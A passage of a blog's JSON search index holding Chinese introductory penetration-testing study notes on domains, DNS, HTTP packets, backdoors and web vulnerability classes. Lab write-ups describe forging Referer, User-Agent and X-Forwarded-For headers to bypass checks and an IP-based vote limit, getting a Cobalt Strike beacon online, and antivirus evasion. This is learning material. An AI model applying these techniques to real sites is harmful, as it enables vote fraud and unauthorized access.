借助特定行业源码或咸鱼进行搜索获取-本地搭建-代码审计或其他","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"小迪学习笔记","slug":"小迪学习笔记","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"基础入门","slug":"基础入门","permalink":"https://al0nez.github.io/tags/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/"}]},{"title":"03基础入门--搭建安全拓展","slug":"03基础入门-搭建安全拓展","date":"2021-09-21T02:24:58.000Z","updated":"2021-09-21T06:06:14.759Z","comments":true,"path":"2021/09/21/03基础入门-搭建安全拓展/","link":"","permalink":"https://al0nez.github.io/2021/09/21/03%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%90%AD%E5%BB%BA%E5%AE%89%E5%85%A8%E6%8B%93%E5%B1%95/","excerpt":"😆😆😆😆😆😆","text":"😆😆😆😆😆😆 常见搭建平台（中间件）脚本启用ASP,PHP,ASPX,JSP,PY,JAVAWEB等环境 域名IP目录解析安全问题域名访问的是该网站的根目录，而IP是从域名的上一级开始访问的。扫描目录的时候，扫描IP会多扫出一些东西 常见文件后缀解析对应安全网站可能对一些文件的后缀名执行错误 常见安全测试中的安全防护1.限制外部成员访问内部网站，限制IP地址规范访问权限 2.身份验证和访问控制 如果取消匿名访问，需要访问者输出用户名和密码才能访问。 3.限制IP地址访问 可以通过限制运行某一IP访问网站，或者拒绝某个IP访问网站。 WEB源码中敏感文件后台路径，数据库配置文件，备份文件等 WEB 后门与用户及文件权限1.来宾用户一般是网站权限用户，禁止来宾用户权限，导致连接后门看不到任何东西。 2.通过将目录的读写权限中的写入权限拒绝，使我们虽然用后门连接成功，但是没有写入的权限。解决方法是换一个目录进行写入。 演示案例基于中间件的简要识别通过抓包查看中间件 基于中间件的安全漏洞 相关练习平台 www.vulhub.org https://www.vulnhub.com/ vulhub靶场开启 12sudo docker-compose buildsudo docker-compose up -d 关闭 1sudo docker-compose down","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"小迪学习笔记","slug":"小迪学习笔记","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"基础入门","slug":"基础入门","permalink":"https://al0nez.github.io/tags/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/"}]},{"title":"02基础入门--数据包拓展","slug":"02基础入门-数据包拓展","date":"2021-09-12T08:48:57.000Z","updated":"2021-09-21T06:06:25.733Z","comments":true,"path":"2021/09/12/02基础入门-数据包拓展/","link":"","permalink":"https://al0nez.github.io/2021/09/12/02%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%95%B0%E6%8D%AE%E5%8C%85%E6%8B%93%E5%B1%95/","excerpt":"😆😆😆😆😆😆","text":"😆😆😆😆😆😆 网站解析对应简要网站搭建过程https://www.cnblogs.com/GodSince/p/12010184.html 涉及到的攻击层面？源码，搭建平台，系统，网络层等 涉及到的安全问题？目录，敏感文件，弱口令，IP 及域名等 HTTP/S数据包Request请求数据包 Response返回数据包 Request请求数据包 Proxy代理服务器 Response返回数据包 关于HTTP和HTTPSHTTP（HyperText Transfer Protocol：超文本传输协议）是一种用于分布式、协作式和超媒体信息系统的应用层协议。 简单来说就是一种发布和接收 HTML 页面的方法，被用于在 Web 浏览器和网站服务器之间传递信息。 HTTP 默认工作在 TCP 协议 80 端口，用户访问网站 http:// 打头的都是标准 HTTP 服务。 HTTP 协议以明文方式发送内容，不提供任何方式的数据加密，如果攻击者截取了Web浏览器和网站服务器之间的传输报文，就可以直接读懂其中的信息，因此，HTTP协议不适合传输一些敏感信息，比如：信用卡号、密码等支付信息。 HTTPS（Hypertext Transfer Protocol Secure：超文本传输安全协议）是一种透过计算机网络进行安全通信的传输协议。HTTPS 经由 HTTP 进行通信，但利用 SSL/TLS 来加密数据包。HTTPS 开发的主要目的，是提供对网站服务器的身份认证，保护交换数据的隐私与完整性。 HTTPS 默认工作在 TCP 协议443端口，它的工作流程一般如以下方式： 1、TCP 三次同步握手 2、客户端验证服务器数字证书 3、DH 算法协商对称加密算法的密钥、hash 算法的密钥 4、SSL 安全加密隧道协商完成 5、网页以加密的方式传输，用协商的对称加密算法和密钥加密，保证数据机密性；用协商的hash算法进行数据完整性保护，保证数据不被篡改。 HTTP和HTTPS的简要通信过程 HTTP： 12345建立连接——&gt;发送请求数据包——&gt;返回响应数据包——&gt;关闭连接1.浏览器建立与 web 服务器之间的连接2.浏览器将请求数据打包（生成请求数据包）并发送到 web 服务器3.web 服务器将处理结果打包（生成响应数据包）并发送给浏览器4.web 服务器关闭连接 HTTPS： HTTP/HTTPS 具体区别？ HTTP 明文传输，数据都是未加密的，安全性较差，HTTPS（SSL+HTTP） 数据传输过程是加密的，安全性较好。 使用 HTTPS 协议需要到 CA（Certificate Authority，数字证书认证机构） 申请证书，一般免费证书较少，因而需要一定费用。证书颁发机构如：Symantec、Comodo、GoDaddy 和 GlobalSign 等。 HTTP 页面响应速度比 HTTPS 快，主要是因为 HTTP 使用 TCP 三次握手建立连接，客户端和服务器需要交换 3 个包，而 HTTPS除了 TCP 的三个包，还要加上 ssl 握手需要的 9 个包，所以一共是 12 个包。 http 和 https 使用的是完全不同的连接方式，用的端口也不一样，前者是 80，后者是 443。 HTTPS 其实就是建构在 SSL/TLS 之上的 HTTP 协议，所以，要比较 HTTPS 比 HTTP 要更耗费服务器资源。 Request 请求数据包数据格式1234请求行：请求类型/请求资源路径、协议的版本和类型请求头：一些键值对，浏览器与 web 服务器之间都可以发送，特定的某种含义空行：请求头与请求体之间用一个空行隔开；请求体：要发送的数据(一般 post 提交会使用)；例：user=123&amp;pass=123 例如：Request Headers 12345678910111213POST /adduser HTTP/1.1Host: localhost:8030Connection: keep-aliveContent-Length: 16Pragma: no-cacheCache-Control: no-cacheOrigin: chrome-extension://fdmmgilgnpjigdojojpjoooidkmcomcmUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)Chrome/66.0.3359.181 Safari/537.36Content-Type: application/x-www-form-urlencodedAccept: */*Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9 请求行请求行由三个标记组成：请求方法、请求 URL 和 HTTP 版本，它们用空格分享。 例如： 1GET /index.html HTTP/1.1 HTTP 规划定义了 8 种可能的请求方法： 12345678GET：检索 URL 中标识资源的一个简单请求HEAD：与 GET 方法相同，服务器只返回状态行和头标，并不返回请求文档POST：服务器接受被写入客户端输出流中的数据的请求PUT：服务器保存请求数据作为指定 URL 新内容的请求DELETE：服务器删除 URL 中命令的资源的请求OPTIONS：关于服务器支持的请求方法信息的请求TRACE：web 服务器反馈 Http 请求和其头标的请求CONNECT ：已文档化，但当前未实现的一个方法，预留做隧道处理 请求头由关键字/值对组成，每行一对，关键字和值用冒号分享。请求头标通知服务器腾于客户端的功能和标识。 1234567891011121314HOST: 主机或域名地址Accept：指浏览器或其他客户可以接爱的 MIME 文件格式。Servlet 可以根据它判断并返回适当的文件格式。User-Agent：是客户浏览器名称Host：对应网址 URL 中的 Web 名称和端口号。Accept-Langeuage：指出浏览器可以接受的语言种类，如 en 或 en-us，指英语。connection：用来告诉服务器是否可以维持固定的 HTTP 连接。http 是无连接的，HTTP/1.1 使用 Keep-Alive为默认值，这样，当浏览器需要多个文件时(比如一个 HTML 文件和相关的图形文件)，不需要每次都建立连接Cookie：浏览器用这个属性向服务器发送 Cookie。Cookie 是在浏览器中寄存的小型数据体，它可以记载和服务器相关的用户信息，也可以用来实现会话功能。Referer：表明产生请求的网页URL。如比从网页/icconcept/index.jsp中点击一个链接到网页/icwork/search ， 在 向 服 务 器 发 送 的 GET/icwork/search 中 的 请 求 中 ， Referer 是http://hostname:8080/icconcept/index.jsp。这个属性可以用来跟踪 Web 请求是从什么网站来的。Content-Type：用来表名 request 的内容类型。可以用 HttpServletRequest 的 getContentType()方法取得。Accept-Charset：指出浏览器可以接受的字符编码。英文浏览器的默认值是 ISO-8859-1.Accept-Encoding：指出浏览器可以接受的编码方式。编码方式不同于文件格式，它是为了压缩文件并加速文件传递速度。浏览器在接收到 Web 响应之后先解码，然后再检查文件格式。 空行最后一个请求头标之后是空行，发送回车符和退行，通知服务器以下不再有头标。 请求数据使用 POST 传送，最常使用的是 Content-Type 和 Content-Length 头标。 Response 返回数据包数据格式一个响应由四个部分组成；状态行、响应头标、空行、响应数据。 1234状态行：协议版本、数字形式的状态代码和状态描述，个元素之间以空格分隔响应头标：包含服务器类型、日期、长度、内容类型等空行：响应头与响应体之间用空行隔开响应数据：浏览器会将实体内容中的数据取出来，生成相应的页面 HTTP 响应码：123451xx：信息，请求收到，继续处理2xx：成功，行为被成功地接受、理解和采纳3xx：重定向，为了完成请求，必须进一步执行的动作4xx：客户端错误5xx：服务器错误 响应头标想请求头标一样，他们指出服务器的功能，标识出响应数据的细节 空行最后一个响应头标之后是一个空行，发送回车间和退行，表明服务器以下不再有头标 响应数据HTML文档和图像等，也是HTML本身 演示案例Burp Suite 抓包 第三方检测修改实现XSS攻击已经被修复了。 来源页伪造https://www.mozhe.cn/bug/detail/56 在burp上进行抓包进行来源页吗修改 修改Referer参数，地址来源 浏览器信息伪造 需要伪造IPhone手机和2G信号 通过伪造User-Agent来实现 1Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X)AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12A365 MicroMessenger/6.0NetType/2G 成功伪造 HTTP动作练习这里应该是需要将GET方式改为POST方式，bp抓包然后选择变更请求方式，然后发包。 投票系统缺陷要求让ggg获得第一。 抓一下包看一下。应该是通过ip去限制投票次数，这里使用X-Forwarded-For来伪造ip，然后就可以无限投票了。 成功得到第一","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"小迪学习笔记","slug":"小迪学习笔记","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"基础入门","slug":"基础入门","permalink":"https://al0nez.github.io/tags/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/"}]},{"title":"01基础入门--概念名词","slug":"01基础入门-概念名词","date":"2021-09-10T07:15:08.000Z","updated":"2021-09-21T06:06:22.407Z","comments":true,"path":"2021/09/10/01基础入门-概念名词/","link":"","permalink":"https://al0nez.github.io/2021/09/10/01%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%A6%82%E5%BF%B5%E5%90%8D%E8%AF%8D/","excerpt":"😆😆😆😆😆😆","text":"😆😆😆😆😆😆 域名什么是域名域名（Domain names）是互联网基础架构的关键部分。它们为互联网上任何可用的网页服务器提供了方便人类理解的地址。 任何连上互联网的电脑都可以通过一个公共IP地址访问到，对于IPv4地址来说，这个地址有32位（它们通常写成四个范围在0~255以内，由点分隔的数字组成，比如173.194.121.32），而对于IPv6来说，这个地址有128位，通常写成八组由冒号分隔的四个十六进制数(e.g., 2027:0da8:8b73:0000:0000:8a2e:0370:1337). 计算机可以很容易地处理这些IP地址, 但是对一个人来说很难找出谁在操控这些服务器以及这些网站提供什么服务。IP 地址很难记忆而且可能会随着时间的推移发生改变 。为了解决这些问题，我们使用方便记忆的地址，称作域名。 域名在哪里注册域名注册是Internet中用于解决地址对应问题的一种方法。根据中国互联网络域名管理办法，域名注册服务机构及域名注册管理机构需对申请人提出的域名是否违反了第三方的权利和申请人的真实身份进行核验。每一个相同顶级域名中的二级域名注册都是独一无二的，不可重复的，但不同顶级域名中的二级域名可以是相同的，例如baidu这个二级域名曾可以在.com中注册，也可以在.cn中注册，也可以在.xyz中及其他多种顶级域名中注册，且每个域名都起到同样的作用。因此，在网络上域名是一种相对有限的资源，它的价值随着注册企业和个人用户的增多而逐步为人们所重视。一般域名需要通过域名注册商去注册。 顶级域名、一级域名1234567891011121314151617Top-level domains，first-level domains（TLDs），也翻译为国际顶级域名，也成一级域名。 .com 供商业机构使用，但无限制最常用 .net 原供网络服务供应商使用，现无限制 .org 原供不属于其他通用顶级域类别的组织使用，现无限制 .edu / .gov / .mil 供美国教育机构/美国政府机关/美国军事机构。因历史遗留问题一般只在美国专用 .aero 供航空运输业使用 .biz 供商业使用 .coop 供联合会（cooperatives）使用 .info 供信息性网站使用，但无限制 .museum 供博物馆使用 .name 供家庭及个人使用 .pro 供部分专业使用 .asia 供亚洲社区使用 .tel 供连接电话网络与因特网的服务使用 .post 供邮政服务使用 .mail 供邮件网站使用 国家顶级域名：cn（中国大陆）、de（德国）、eu（欧盟）、jp（日本）、hk（中国香港）、tw（中国台湾）、uk（英国）、us（美国） 什么是二级域名多级域名？二级域（或称二级域名；英语：Second-level domain；英文缩写：SLD）是互联网DNS等级之中，处于顶级域名之下的域。二级域名是域名的倒数第二个部分，例如在域名example.baidu.com中，二级域名是Baidu。 .com 顶级域名/一级域名，更准确的说叫顶级域 baidu.com 二级域名，更准确的说叫二级域 tieba.baidu.com 三级域名，更准确的说叫三级域 detail.tieba.baidu.com 四级域名，更准确的说叫四级域 ……. 域名发现对于安全测试意义？ 进行渗透测试时，其主域名找不到漏洞时，就可以尝试去测试收集到的子域名，有可能测试子域名网站时会有意向不到的效果，然后可以由此横向到主网站。 DNS什么是DNS？DNS（Domain Name Server，域名服务器）是进行域名(domain name)和与之相对应的IP地址 (IP address)转换的服务器。DNS中保存了一张域名(domain name)和与之相对应的IP地址 (IP address)的表，以解析消息的域名。 例如百度的域名是www.baidu.com,在DNS中对应的IP是1.2.3.4(假设),那么我们在浏览器中输入百度的域名，DNS就会解析为1.2.3.4。 本地HOSTS与DNS的关系？客户端查询DNS的过程是： 1本地host文件—本地缓存—-DNS服务器 Hosts文件目录 1在Windows中，它的目录通常在C盘的Windows\\system32\\drivers\\etc\\下。 Hosts文件是一个纯文本文件，用记事本就可以将其打开。这个文件是根据TCP/IP for Windows 的标准来工作的，它的作用是包含IP地址和Host name(主机名)的映射关系，每段只能包括一个映射关系，IP地址要放在每段的最前面，后面写Host name(主机名)，中间加个空格。如：127.0.0.1 localhost. 我们知道，当电脑访问网站时，首先通过DNS服务器把网络 域名解析成IP地址后，我们的计算机才能访问。如果每个域名请求都要等待域名服务器解析后返回IP，访问速度就会比较慢，而Hosts文件正可以解决这个问题。在进行DNS请求以前，Windows系统会先检查Hosts文件中是否有这个地址映射关系，如果有则调用这个IP地址映射，如果没有再向DNS服务器提出域名解析。 eg：这里用我自己的博客地址作为演示，当我们ping l0ne1y.github.io的时候可以看到他的ip地址是185.199.110.153。 当我们修改了本地hosts文件后，再次ping l0ne1y.github.io地址，发现ip地址变成了1.2.3.4。 CDN是什么？与DNS的关系？CDN的全称是Content Delivery Network，即内容分发网络。CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。举个例子，现在服务器在北京，深圳的用户想要获取服务器上的数据就需要跨越一个很远的距离，这显然就比北京的用户访问北京的服务器速度要慢。但是现在我们在深圳建立一个CDN服务器，上面缓存住一些数据，深圳用户访问时先访问这个CDN服务器，如果服务器上有用户请求的数据就可以直接返回，这样速度就大大的提升了。 CDN实际上是一个就近访问，那么现在有一个问题是，我们怎么知道用户的所在位置从而给他分配最佳的CDN节点呢。这就需要DNS服务来进行定位了。当我们通过使用DNS服务的时候，可以根据他使用的LDNS服务器来进行一个定位，例如我们的调度服务器看到他是来自深圳电信的LDNS服务器，那么我们就认为该用户来自深圳电信，然后调度服务器可以让该用户去访问深圳电信的CDN服务器，这样就让用户访问到了最优的CDN节点。通过DNS服务我们可以很快的定位到用户的位置，然后给用户分配最佳CDN节点. 常见的DNS安全攻击有哪些? 域名劫持 通过采用黑客手段控制了域名管理密码和域名管理邮箱，然后将该域名的NS纪录指向到黑客可以控制的DNS服务器，然后通过在该DNS服务器上添加相应域名纪录，从而使网民访问该域名时，进入了黑客所指向的内容。这显然是DNS服务提供商的责任，用户束手无策。 缓存投毒 利用控制DNS缓存服务器，把原本准备访问某网站的用户在不知不觉中带到黑客指向的其他网站上。其实现方式有多种，比如可以通过利用网民ISP端的DNS缓存服务器的漏洞进行攻击或控制，从而改变该ISP内的用户访问域名的响应结果;或者，黑客通过利用用户权威域名服务器上的漏洞，如当用户权威域名服务器同时可以被当作缓存服务器使用，黑客可以实现缓存投毒，将错误的域名纪录存入缓存中，从而使所有使用该缓存服务器的用户得到错误的DNS解析结果。 3)DDOS攻击 一种攻击针对DNS服务器软件本身，通常利用BIND软件程序中的漏洞，导致DNS服务器崩溃或拒绝服务;另一种攻击的目标不是DNS服务器，而是利用DNS服务器作为中间的“攻击放大器”，去攻击其它互联网上的主机，导致被攻击主机拒绝服务。 DNS欺骗 DNS欺骗就是攻击者冒充域名服务器的一种欺骗行为。 原理：如果可以冒充域名服务器，然后把查询的IP地址设为攻击者的IP地址，这样的话，用户上网就只能看到攻击者的主页，而不是用户想要取得的网站的主页了，这就是DNS欺骗的基本原理。DNS欺骗其实并不是真的“黑掉”了对方的网站，而是冒名顶替、招摇撞骗罢了。 脚本语言常见的脚本语言类型有哪些？脚本语言又被称为扩建的语言，或者动态语言，是一种编程语言，用来控制软件应用程序，脚本通常以文本（如ASCII)保存，只在被调用时进行解释或编译。Scala、JavaScript，VBScript，ActionScript，MAXScript，ASP，JSP，PHP，SQL，Perl，Shell，python，Ruby，JavaFX，Lua，AutoIt等 不同脚本类型与安全漏洞的关系？不同的脚本语言决定了安全漏洞的多少。 漏洞挖掘代码审计与脚本类型的关系？同上 后门什么是后门？有那些后门？后门是指绕过安全控制而获取对程序或系统访问权的方法。后门的最主要目的就是方便以后再次秘密进入或者控制系统。根据实现方式的不同，可以将后门分为网页后门、线程插入后门、扩展后门、C/S 后门和账户后门等类型。 后门在安全测试中的实际意义？(1)方便下次更方便的进来。 (2)获取到相关权限之后，后门相当于一个管道，便于操作。 关于后门需要了解那些？（玩法，免杀）免杀，就是绕过杀毒软件的防护，避免被检测到。 WEBWEB 的组成架构模型？网站源码：分脚本类型，分应用方向操作系统：windows linux中间件（搭建平台）：apache iis tomcat nginx 等数据库：access mysql mssql oracle sybase db2 postsql 等 架构漏洞安全测试简要介绍？web网站-数据库权限-权限提升-内网。 为什么要从 WEB 层面为主为首？不管是PC还是APP本质上都可以以web为突破口。 WEB相关安全漏洞WEB 源码类对应漏洞1234567SQL 注入文件上传XSS代码执行变量覆盖逻辑漏洞反序列化等 WEB 中间件对应漏洞未授权访问等等 WEB 数据库对应漏洞弱口令等 WEB 系统层对应漏洞提权相关的 其他第三方对应漏洞第三方软件的一些漏洞 eg:QQ APP 或 PC 应用结合类 App或者PC软件的漏洞 演示案例多级域名的枚举查找1.直接百度 2.通过工具进行爆破 这里我使用的是Layer子域名爆破工具，下载链接是https://github.com/euphrat1ca/LayerDomainFinder，字典是https://github.com/k8gege/PasswordDic。 3.域名注册 查询A记录、MX记录、C记录 DNS解析修改后分析（本地或服务）前面有实验过，这里就不弄了。 EXE 后门功能及危害及类似 WEB 后门这里因为没有视频中的软件，所有我这里使用的是CS，进行上线。 关于CS具体操作可以看https://soapffz.com/sec/483.html 可以看到成功上线了。 APP类结合WEB协议，PC类结合WEB协议手机模拟器 需要设置代理，代理ip为PC端ip。 PC端需要通过burp suite进行抓包，设置brup监听端口为代理服务器端口。 之后修改数据包，修改电脑数据包和手机端一致，从app分离出WEB 测试漏洞。","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"小迪学习笔记","slug":"小迪学习笔记","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"基础入门","slug":"基础入门","permalink":"https://al0nez.github.io/tags/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/"}]}],"categories":[],"tags":[{"name":"XML","slug":"XML","permalink":"https://al0nez.github.io/tags/XML/"},{"name":"DTD","slug":"DTD","permalink":"https://al0nez.github.io/tags/DTD/"},{"name":"XXE","slug":"XXE","permalink":"https://al0nez.github.io/tags/XXE/"},{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"小迪学习笔记","slug":"小迪学习笔记","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"PHP反序列化","slug":"PHP反序列化","permalink":"https://al0nez.github.io/tags/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"逻辑越权","slug":"逻辑越权","permalink":"https://al0nez.github.io/tags/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83/"},{"name":"文件下载","slug":"文件下载","permalink":"https://al0nez.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/"},{"name":"文件包含","slug":"文件包含","permalink":"https://al0nez.github.io/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"name":"代码执行","slug":"代码执行","permalink":"https://al0nez.github.io/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"},{"name":"命令执行","slug":"命令执行","permalink":"https://al0nez.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"name":"CSRF","slug":"CSRF","permalink":"https://al0nez.github.io/tags/CSRF/"},{"name":"SSRF","slug":"SSRF","permalink":"https://al0nez.github.io/tags/SSRF/"},{"name":"XSS跨站","slug":"XSS跨站","permalink":"https://al0nez.github.io/tags/XSS%E8%B7%A8%E7%AB%99/"},{"name":"文件上传","slug":"文件上传","permalink":"https://al0nez.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"name":"SQL注入","slug":"SQL注入","permalink":"https://al0nez.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"},{"name":"信息收集","slug":"信息收集","permalink":"https://al0nez.github.io/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"name":"基础入门","slug":"基础入门","permalink":"https://al0nez.github.io/tags/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/"}]}